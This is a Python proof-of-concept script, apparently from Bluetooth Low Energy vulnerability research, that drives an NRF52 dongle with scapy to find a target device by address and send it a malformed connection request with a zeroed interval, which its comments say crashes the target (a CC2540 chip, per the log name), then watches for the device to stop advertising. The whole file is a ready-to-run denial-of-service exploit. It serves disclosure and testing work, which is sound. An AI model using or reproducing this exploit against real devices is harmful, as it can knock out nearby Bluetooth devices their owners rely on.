#!/usr/bin/python 
import os
import platform
import sys
from threading import Timer
from time import sleep

# libs
sys.path.insert(0, os.getcwd() + '/libs')
import colorama
from colorama import Fore
from drivers.NRF52_dongle import NRF52Dongle
from scapy.layers.bluetooth4LE import *
from scapy.utils import wrpcap
from scapy.compat import raw

none_count = 0
slave_connected = False
send_version_ind = False
end_connection = False
slave_addr_type = 0


# Autoreset colors
colorama.init(autoreset=True)

if len(sys.argv) >= 2:
    advertiser_address = sys.argv[1].upper()
else:
    advertiser_address = 'A4:C1:38:D8:AD:B8'

print(Fore.YELLOW + 'Advertiser Address: ' + advertiser_address.upper())


def crash_timeout():
    print(Fore.RED + "No advertisement from " + advertiser_address.upper() +
          ' received\nThe device may have crashed!!!')
    exit(0)


def scan_timeout():
    global slave_addr_type, timeout_scan
    if not slave_connected:
        scan_req = BTLE() / BTLE_ADV(RxAdd=slave_addr_type) / BTLE_SCAN_REQ(
            ScanA=master_address,
            AdvA=advertiser_address)
        driver.send(scan_req)

    timeout_scan = Timer(5, scan_timeout)
    timeout_scan.daemon = True
    timeout_scan.start()


# Default master address
master_address = '5d:36:ac:90:0b:22'
access_address = 0x9a328370
# Open serial port of NRF52 Dongle
driver = NRF52Dongle()
# Send scan request
scan_req = BTLE() / BTLE_ADV(RxAdd=slave_addr_type) / BTLE_SCAN_REQ(
    ScanA=master_address,
    AdvA=advertiser_address)
driver.send(scan_req)

# Start the scan timeout to resend packets
timeout_scan = Timer(5, scan_timeout)
timeout_scan.daemon = True
timeout_scan.start()

timeout = Timer(5.0, crash_timeout)
timeout.daemon = True
timeout.start()
c = False
print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
while True:
    pkt = None
    # Receive packet from the NRF52 Dongle
    data = driver.raw_receive()
    if data:
        # Decode Bluetooth Low Energy Data
        pkt = BTLE(data)
        # if packet is incorrectly decoded, you may not be using the dongle
        if pkt is None:
            none_count += 1
            if none_count >= 4:
                print(Fore.RED + 'NRF52 Dongle not detected')
                sys.exit(0)
            continue
        elif slave_connected and BTLE_EMPTY_PDU not in pkt:
            # Print slave data channel PDUs summary
            print(Fore.MAGENTA + "Slave RX <--- " + pkt.summary()[7:])
        # --------------- Process Link Layer Packets here ------------------------------------
        # Check if packet from advertised is received
        if pkt:
            print(Fore.MAGENTA + "Slave RX <--- " + pkt.summary()[7:])
        if pkt and (BTLE_SCAN_RSP in pkt or BTLE_ADV_IND in pkt) and pkt.AdvA == advertiser_address.lower():
            timeout.cancel()
            slave_addr_type = pkt.TxAdd
            print(Fore.GREEN + advertiser_address.upper() + ': ' + pkt.summary()[7:] + ' Detected')
            # Send connection request to advertiser
            conn_request = BTLE() / BTLE_ADV(RxAdd=slave_addr_type, TxAdd=0) / BTLE_CONNECT_REQ(
                InitA=master_address,
                AdvA=advertiser_address,
                AA=access_address,  # Access address (any)
                crc_init=0x179a9c,  # CRC init (any)
                win_size=2,  # 2.5 of windows size (anchor connection window size)
                win_offset=2,  # 1.25ms windows offset (anchor connection point)
                interval=16,  # 20ms connection interval
                latency=0,  # Slave latency (any)
                timeout=50,  # Supervision timeout, 500ms
                # ---------------------28 Bytes until here--------------------------
                # Truncated when sending over the air, but the initiator will try the following:
                chM=0x0000000001,
                hop=5,  # any, including 0
                SCA=0,  # Clock tolerance
            )
            # This means that the initiator will send the anchor point (Empty PDU) on channel 1 and stay there for every connection event)
            # conn_request[BTLE_ADV].Length=28 # Truncated, but CRC will be correct when sending over the air
            conn_request[BTLE_CONNECT_REQ].interval = 0  # Clearing the interval time triggers the crash.
            # conn_request[BTLE_ADV].timeout=0 # Clearing the supervision timeout triggers the crash.

            # chM=0x1FFFFFFFFF,

            # Yes, we're sending raw link layer messages in Python. Don't tell anyone as this is forbidden!!!
            driver.send(conn_request)
            wrpcap('logs/CC2540_connection_req_crash.pcap', conn_request)
            print(Fore.YELLOW + 'Malformed connection request was sent')

            # Start the timeout to detect crashes
            timeout = Timer(5.0, crash_timeout)
            timeout.daemon = True
            timeout.start()

    sleep(0.01)
